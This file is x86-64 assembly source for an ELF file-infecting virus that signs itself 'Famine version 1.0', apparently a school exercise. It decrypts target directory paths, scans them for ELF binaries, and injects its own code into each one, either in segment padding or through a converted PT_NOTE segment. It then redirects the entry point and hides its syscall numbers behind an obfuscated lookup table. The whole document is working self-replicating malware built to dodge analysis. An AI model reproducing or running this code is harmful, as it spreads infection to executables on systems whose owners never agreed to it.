; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing asYacIiH on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel Ksse8A]     ; dir to open for arg readDir
mov rsi, VdE92Qr
call TANLGTNy

lea rdi, [rel y3txKZrJ]
mov rsi, pSrtyGT
call TANLGTNy
OgNto:
POPA
mov rsp, rbp
pop rbp
JPxPj:
jmp WLKiC

; take directory to open in rdi && size of pwd on rsi
TANLGTNy:
push rbp
mov rbp, rsp
push rax
push rsi
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
sub rsp, asYacIiH_size
push rsi
lea r8, FAM(asYacIiH.I07ULI)
or qword [r8], -1
lea r8, FAM(asYacIiH.cFfqKn)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(asYacIiH.j19w4jkMG)
mov [r8], rsi
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 13]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 48]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 83]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 83]
or rax, r14
pop r14
pop r15
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the mBue3doxFV size back to unmap
jl P1MmB
lea rdi, FAM(asYacIiH.I07ULI)             ; enregistre le I07ULI dans la struct
mov [rdi], rax

kyGEyX1:
lea r10, FAM(asYacIiH.I07ULI)
mov rdi, [r10]
lea r9, FAM(asYacIiH.Rc0zrpnj8u)              ; init Rc0zrpnj8u
mov DWORD [r9], 0 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 24]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 59]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 94]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 94]
or rax, r14
pop r14
pop r15
lea rsi, FAM(asYacIiH.JWHcecBDX7)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 6]
shl r14, 0x18
or rdx,  r14
movzx r14, byte [r15 + 41]
shl r14, 0x10
or rdx,  r14
movzx r14, byte [r15 + 76]
shl r14, 0x8
or rdx,  r14
movzx r14, byte [r15 + 76]
or rdx, r14
pop r14
pop r15
syscall
cmp rax, 0 
jle P1MmB

lea r10, FAM(asYacIiH.q55H59a0P)  ; r10 -> (struct asYacIiH.diretents_struct_ptr)
mov [r10], rsi                           ; asYacIiH.q55H59a0P -> asYacIiH.JWHcecBDX7
lea r11, FAM(asYacIiH.dNqOTE0b)       ; r11 -> (struct asYacIiH.dNqOTE0b)
mov DWORD [r11], eax 

rMiVBD:
lea r8, FAM(asYacIiH.Rc0zrpnj8u)        ; r8 -> total lu de getdents
lea r9, FAM(asYacIiH.dNqOTE0b)        ; r9 -> total a lire de getdents
mov r10, FAM(asYacIiH.q55H59a0P)  ; r10 -> actual dirent struct
lea r11, FAM(asYacIiH.q55H59a0P)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; asYacIiH.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8
jne N1L4k0

JavYSrqZ:
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
sub rsi, FAM(asYacIiH.j19w4jkMG)
mov rdi, FAM(asYacIiH.cFfqKn)
call K9b3TiHd

SsAyjpSdfL:
call SQ2KmD30

N1L4k0:
mov r8, FAM(asYacIiH.Rc0zrpnj8u)
mov r12, FAM(asYacIiH.dNqOTE0b)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(asYacIiH.cFfqKn)
mov rsi, FAM(asYacIiH.j19w4jkMG)
jge kyGEyX1
jmp rMiVBD

SQ2KmD30:
push rbp
mov rbp, rsp
sub rsp, BiAtmoD_size
lea rax, INF(BiAtmoD.vxKjm)
mov qword [rax], 0 
lea rax, INF(BiAtmoD.qKN947)
mov byte [rax], 0 
lea rax, INF(BiAtmoD.j1vK4)
mov qword [rax], 0 

Aq3cbfups:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 13]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 48]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 83]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 83]
or rax, r14
pop r14
pop r15
mov rdi, rsi
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 27]
shl r14, 0x18
or rsi,  r14
movzx r14, byte [r15 + 62]
shl r14, 0x10
or rsi,  r14
movzx r14, byte [r15 + 97]
shl r14, 0x8
or rsi,  r14
movzx r14, byte [r15 + 97]
or rsi, r14
pop r14
pop r15
xor rdx, rdx
syscall
cmp rax, 0x0 
jl PPFlz
mov INF(BiAtmoD.sXiI4VdFk), rax

; === get file size ===
Rlptz:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 54]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 89]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 89]
or rax, r14
pop r14
pop r15
mov rdi, INF(BiAtmoD.sXiI4VdFk)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or rsi,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or rsi,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or rsi,  r14
movzx r14, byte [r15 + 73]
or rsi, r14
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 13]
shl r14, 0x18
or rdx,  r14
movzx r14, byte [r15 + 48]
shl r14, 0x10
or rdx,  r14
movzx r14, byte [r15 + 83]
shl r14, 0x8
or rdx,  r14
movzx r14, byte [r15 + 83]
or rdx, r14
pop r14
pop r15
syscall
cmp rax, 0x0 
jle xTLShHqxB
mov INF(BiAtmoD.ltGaulDEj), rax
mov INF(BiAtmoD.zPXhHZ), rax

pqXegbFI:
; rax -> map
mov rsi, rax        ; rsi = file_size
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 20]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 55]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 90]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 90]
or rax, r14
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or rdi,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or rdi,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or rdi,  r14
movzx r14, byte [r15 + 73]
or rdi, r14
pop r14
pop r15
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
or r10,  r14
movzx r14, byte [r15 + 67]
shl r14, 0x10
or r10,  r14
movzx r14, byte [r15 + 102]
shl r14, 0x8
or r10,  r14
movzx r14, byte [r15 + 102]
or r10, r14
pop r14
pop r15
mov r8, INF(BiAtmoD.sXiI4VdFk)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or r9,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or r9,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or r9,  r14
movzx r14, byte [r15 + 73]
or r9, r14
pop r14
pop r15
syscall
cmp rax, 0x0 
jl xTLShHqxB
lea r8, INF(BiAtmoD.YuHIhs)
mov [r8], rax

mNJjmIR:
cmp dword [rax + 1], 0x02464c45 
jne BXtI4

TgG9mAHQ:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + impsGxPB.PNZytEGfwm]
xor rcx, rcx
q5RDCr8c:
cmp cx, [r15  + impsGxPB.LxdOj7Z]
jge ipB8t6EiCK 
add r14, KCsto_size
inc rcx
jmp q5RDCr8c
ipB8t6EiCK:
mov INF(BiAtmoD.cKkSa), r14
xor r9, r9
PPFCr:
cmp cx, 0 
jle KZgb6Gz
tlALSJJnh:
bt word [r14], 0 
jnc lKMn2aU1
bt qword [r14], 0x20 
jc Rb7ieBD
lKMn2aU1:
dec rcx
sub r14, KCsto_size
jmp PPFCr

KZgb6Gz:
mov r9, INF(BiAtmoD.vxKjm)
cmp r9, 0 
je BXtI4
cmp byte INF(BiAtmoD.qKN947), 1 
je E58HKT
jmp kneDN0R2eP          ; else jmp kneDN0R2eP

Rb7ieBD:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
oM7xMfLDt:
; r8 -> potential boHBsOzd
; r9 == boHBsOzd variable
mov r8, r15
add r8, [r14 + KCsto.DXAWXqe]
add r8, [r14 + KCsto.zEakUM]
sub r8, AMYoM
; mov r9, [rel boHBsOzd]
lea r9, boHBsOzd
; mov rdi, r9
; mov rsi, AMYoM
; push rax
; call _decrypt_str
; mov r9, rax
; pop rax
mov r10, [r9]
cmp qword r10, [r8]
je BXtI4
mov rdi, r9
mov rsi, AMYoM
push rcx
call VmEVG3c
pop rcx

dFaDN2WzW:
mov r9, INF(BiAtmoD.vxKjm)
test r9, r9
jz mJXCW7OCKi
mov r9, INF(BiAtmoD.qKN947)
test r9, r9
jz lKMn2aU1

mJXCW7OCKi:
; r8 == end of BiAtmoD offset
; r9 == next segment offset
mov r8, [r14 + KCsto.DXAWXqe]
add r8, [r14 + KCsto.zEakUM]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, KCsto_size
add r9, KCsto.DXAWXqe
cmp [r9], r8
setb INF(BiAtmoD.qKN947)   ; if ([r9] < r8) { BiAtmoD.qKN947 = 1) }

fKkhHvu:
; r8 -> BiAtmoD structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (mJXCW7OCKi)
;*r14 -> segment header in header table
lea r8, INF(BiAtmoD.P0b9KBM)
mov [r8], cl
lea r8, INF(BiAtmoD.WaZpVsopfb)
mov r12, [r15 + impsGxPB.mVL6TXMMr]
mov [r8], r12
lea r8, INF(BiAtmoD.vxKjm)
mov [r8], r13
lea r8, INF(BiAtmoD.BOPGRgU)
push r9
mov r9, [r14 + KCsto.pforSDni1g]
add r9, [r14 + KCsto.hVFrCdlV]
mov [r8], r9
pop r9
lea r8, INF(BiAtmoD.eN3hl)
mov [r8], r14
jmp lKMn2aU1

E58HKT:
xZI7lyNy20:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 23]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 58]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 93]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 93]
or rax, r14
pop r14
pop r15
mov rdi, INF(BiAtmoD.sXiI4VdFk)
lea rsi, INF(BiAtmoD.ltGaulDEj)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl BXtI4

Pzhs41J:
mov rdi, INF(BiAtmoD.YuHIhs)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 21]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 56]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 91]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 91]
or rax, r14
pop r14
pop r15
syscall

Ywb78:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 20]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 55]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 90]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 90]
or rax, r14
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or rdi,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or rdi,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or rdi,  r14
movzx r14, byte [r15 + 73]
or rdi, r14
pop r14
pop r15
mov rsi, INF(BiAtmoD.ltGaulDEj)    ; rsi = file_size
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
or r10,  r14
movzx r14, byte [r15 + 67]
shl r14, 0x10
or r10,  r14
movzx r14, byte [r15 + 102]
shl r14, 0x8
or r10,  r14
movzx r14, byte [r15 + 102]
or r10, r14
pop r14
pop r15
mov r8, INF(BiAtmoD.sXiI4VdFk)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or r9,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or r9,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or r9,  r14
movzx r14, byte [r15 + 73]
or r9, r14
pop r14
pop r15
syscall
cmp rax, 0x0 
jl xTLShHqxB
lea r8, INF(BiAtmoD.YuHIhs)
mov [r8], rax

ZMugM:
mov r14, INF(BiAtmoD.YuHIhs)
movzx rax, word [r14 + impsGxPB.o8hQqdyL0a]
add r14, [r14 + impsGxPB.QN8BA]
xor rcx, rcx

NpUZL:
cmp rcx, rax
jge jSTEy8itT3
mov rbx, [r14 + i5MveWHzJ.Ti2ktE]
add rbx, [r14 + i5MveWHzJ.RATfWF]
cmp INF(BiAtmoD.j1vK4), rbx
jge UQI8u
mov INF(BiAtmoD.j1vK4), rbx

UQI8u:
add r14, i5MveWHzJ_size
inc rcx
jmp NpUZL

jSTEy8itT3:

CZX130:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(BiAtmoD.YuHIhs)
movzx rax, word [r14 + impsGxPB.LxdOj7Z]
add r14, [r14 + impsGxPB.PNZytEGfwm]
xor rcx, rcx

TvFoAuM:
cmp rcx, rax
jge CrJ1R68m
cmp dword [r14 + KCsto.WKxBPlOdyp], 0x4
je OLZwlhF

C3Z94C:
add r14, KCsto_size
inc rcx
jmp TvFoAuM

CrJ1R68m:
mov r14, -1 

OLZwlhF:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl mEvFVG6D4M
mov dword [r14 + KCsto.WKxBPlOdyp], 0x1
mov qword [r14 + KCsto.JEMMgFn7S], 0x1| 0x4
mov qword [r14 + KCsto.zEakUM], CODE_LEN 
mov qword [r14 + KCsto.hVFrCdlV], CODE_LEN 
mov qword [r14 + KCsto.cweMk], 0x1000 
mov rax, INF(BiAtmoD.zPXhHZ)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + KCsto.DXAWXqe], rax
mov qword INF(BiAtmoD.vxKjm), rax
mov rax, INF(BiAtmoD.j1vK4)
add rax, 0x1000 
and rax, -4096
mov qword INF(BiAtmoD.BOPGRgU), rax
mov qword [r14 + KCsto.pforSDni1g], rax
mov qword [r14 + KCsto.hhvlVPBoI4], rax

kneDN0R2eP:
tUgnF:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(BiAtmoD.YuHIhs)
add r8, impsGxPB.mVL6TXMMr
mov r10, INF(BiAtmoD.BOPGRgU)
mov [r8], r10
cmp byte INF(BiAtmoD.qKN947), 0 
jg ot9RDaCAtN
mov rdi, CODE_LEN 
call qu2E77T

ot9RDaCAtN:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (KgogLl8SP - _start)
mov rdi, INF(BiAtmoD.YuHIhs)
add rdi, INF(BiAtmoD.vxKjm)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN 
cld          ; copy from _start to KgogLl8SP (= !std)
rep movsb

mEvFVG6D4M:
; r8 -> JPxPj instruction's addr (JPxPj + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(BiAtmoD.YuHIhs)
add r8, INF(BiAtmoD.vxKjm)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(BiAtmoD.BOPGRgU)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(BiAtmoD.WaZpVsopfb)
sub r9, r10
mov [r8], r9d
jmp BXtI4

qu2E77T:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(BiAtmoD.eN3hl)
push r8           ; save header start for later

; * Update file size *
add r8, qword KCsto.zEakUM
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, KCsto.hVFrCdlV
add qword [r8], rdi

ret

BXtI4:
lea rdi, INF(BiAtmoD.YuHIhs)
lea rsi, INF(BiAtmoD.ltGaulDEj)
call VmEVG3c
jmp xTLShHqxB

VmEVG3c:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 21]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 56]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 91]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 91]
or rax, r14
pop r14
pop r15
syscall
ret

xTLShHqxB:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 18]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 53]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 88]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 88]
or rax, r14
pop r14
pop r15
mov rdi, INF(BiAtmoD.sXiI4VdFk)
syscall
mov qword INF(BiAtmoD.sXiI4VdFk), -1
jmp PPFlz

P1MmB:
mov rdi, FAM(asYacIiH.I07ULI)
cmp rdi, 0 
jle PPFlz
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 18]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 53]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 88]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 88]
or rax, r14
pop r14
pop r15
syscall
mov rdi, FAM(asYacIiH.cFfqKn)
mov rsi, FAM(asYacIiH.j19w4jkMG)
call VmEVG3c
or qword FAM(asYacIiH.I07ULI), -1
jmp PPFlz

PPFlz:
leave
ret

WLKiC:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 8]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 43]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 78]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 78]
or rax, r14
pop r14
pop r15
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
K9b3TiHd:
xor rcx, rcx
eJlqYK:
cmp byte [rdi + rcx], 0 
je oZEck
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp eJlqYK

oZEck:

ret

; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 20]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 55]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 90]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 90]
or rax, r14
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or rdi,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or rdi,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or rdi,  r14
movzx r14, byte [r15 + 73]
or rdi, r14
pop r14
pop r15
mov rsi, 0x8c 
mov rdx, 0x2| 0x4
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
or r10,  r14
movzx r14, byte [r15 + 67]
shl r14, 0x10
or r10,  r14
movzx r14, byte [r15 + 102]
shl r14, 0x8
or r10,  r14
movzx r14, byte [r15 + 102]
or r10, r14
pop r14
pop r15
mov r8, -1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
or r9,  r14
movzx r14, byte [r15 + 38]
shl r14, 0x10
or r9,  r14
movzx r14, byte [r15 + 73]
shl r14, 0x8
or r9,  r14
movzx r14, byte [r15 + 73]
or r9, r14
pop r14
pop r15
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov qword [rax + 0], 0x00000000 
mov qword [rax + 4], 0x02000000 
mov qword [rax + 8], 0x00000000 
mov qword [rax + 12], 0x00000000 
mov qword [rax + 16], 0x00000000 
mov qword [rax + 20], 0x00000000 
mov qword [rax + 24], 0x00000000 
mov qword [rax + 28], 0x00000000 
mov qword [rax + 35], 0x00000000 
mov qword [rax + 39], 0x46000000 
mov qword [rax + 43], 0x00000000 
mov qword [rax + 47], 0x00000000 
mov qword [rax + 51], 0x00000000 
mov qword [rax + 55], 0x00000000 
mov qword [rax + 59], 0x00000000 
mov qword [rax + 63], 0x00000000 
mov qword [rax + 70], 0x00000000 
mov qword [rax + 74], 0x4c001000 
mov qword [rax + 78], 0x00000000 
mov qword [rax + 82], 0x00000000 
mov qword [rax + 86], 0x00000000 
mov qword [rax + 90], 0x00000000 
mov qword [rax + 94], 0x00000000 
mov qword [rax + 98], 0x00000000 
mov qword [rax + 105], 0x64000100 
mov qword [rax + 109], 0x45200005 
mov qword [rax + 113], 0x60030203 
mov qword [rax + 117], 0x22020945 
mov qword [rax + 121], 0x00440308 
mov qword [rax + 125], 0x090b3c4d 
mov qword [rax + 129], 0xd9000102 
mov qword [rax + 133], 0x08101213 
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len YHBFvRd
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> YHBFvRd
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 9]
shl r14, 0x18
or rdx,  r14
movzx r14, byte [r15 + 44]
shl r14, 0x10
or rdx,  r14
movzx r14, byte [r15 + 79]
shl r14, 0x8
or rdx,  r14
movzx r14, byte [r15 + 79]
or rdx, r14
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 12]
shl r14, 0x18
or r10,  r14
movzx r14, byte [r15 + 47]
shl r14, 0x10
or r10,  r14
movzx r14, byte [r15 + 82]
shl r14, 0x8
or r10,  r14
movzx r14, byte [r15 + 82]
or r10, r14
pop r14
pop r15
mov r8, -1                      ; I07ULI = -1
xor r9, r9 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 14]
shl r14, 0x18
or rax,  r14
movzx r14, byte [r15 + 49]
shl r14, 0x10
or rax,  r14
movzx r14, byte [r15 + 84]
shl r14, 0x8
or rax,  r14
movzx r14, byte [r15 + 84]
or rax, r14
pop r14
pop r15
syscall
cmp rax, 0 
jl _decrypt_loop_end
movq xmm15, rax
mov r11, rax
lea rsi, YHBFvRd
call QE0oQv
mov r9, rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
mov rax, rcx
xor rdx, rdx
cmp rcx, 0 
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
movzx r10, byte [rsi + rdx] ; r10 == YHBFvRd[rcx % YHBFvRd_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
 
;; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
RWypEhejNu:
;; rax == div quotient
;; rbx -> to_decrypt
;; rcx == counter
;; rdx == div modulo
;; r9 == len YHBFvRd
;; r10 -> key_char
;; r11 -> decrypted str (mmap)
;; r12 == len to_decrypt
;; rsi -> YHBFvRd
;push rbx
;push rcx
;push rdx
;push r8
;push r9
;push r10
;push r11
;push r12
;mov rbx, rdi
;mov r12, rsi



;mov r8, -1                      ; I07ULI = -1


;syscall

;jl _decrypt_loop_end
;mov r11, rax
;lea rsi, YHBFvRd
;call QE0oQv
;mov r9, rax
;xor rcx, rcx
;xor rdx, rdx
urVNo:
;cmp rcx, r12
;jge _decrypt_loop_end
;mov rax, rcx
;xor rdx, rdx

;jne _no_zero
;xor rax, rax
;jmp _end_div
tWYnsSpXR:
;div r9
lrvP4:
;movzx r10, byte [rsi + rdx] ; r10 == YHBFvRd[rcx % YHBFvRd_len]
;xor r10b, [rbx + rcx]
;mov [r11 + rcx], r10b
;inc rcx
;jmp _decrypt_loop
LEjpsX78zf:
;mov rax, r11
;pop r12
;pop r11
;pop r10
;pop r9
;pop r8
;pop rdx
;pop rcx
;pop rbx
;ret

; debug
; strlen(str:rsi)
QE0oQv:
xor rcx, rcx

aokC0Aky:
cmp byte [rsi + rcx], 0 
je lcnxQij
inc rcx
jmp aokC0Aky

lcnxQij:
mov rax, rcx
ret


RNnOhN dq 0x45 
mBue3doxFV db 0x32, 0x7A, 0x19, 0x32, 0x36, 0x57, 0x56, 0x3E, 0x09, 0x15, 0x07, 0x3D, 0x14, 0x29 
Ksse8A db 0x5C, 0x5D, 0x1D, 0x2F, 0x69, 0x4F, 0x56, 0x1E, 0x09, 0x67 
VdE92Qr    equ $ - Ksse8A
y3txKZrJ db 0x5C, 0x5D, 0x1D, 0x2F, 0x69, 0x4F, 0x56, 0x1E, 0x09, 0x55, 0x6E 
pSrtyGT    equ $ - y3txKZrJ
YHBFvRd db 0x73, 0x29, 0x70, 0x5F, 0x46, 0x3B, 0x33, 0x6D, 0x7D, 0x67, 0x6E, 0x53 
zrxu7sPEm db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
boHBsOzd db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
AMYoM equ $ - boHBsOzd
KgogLl8SP: 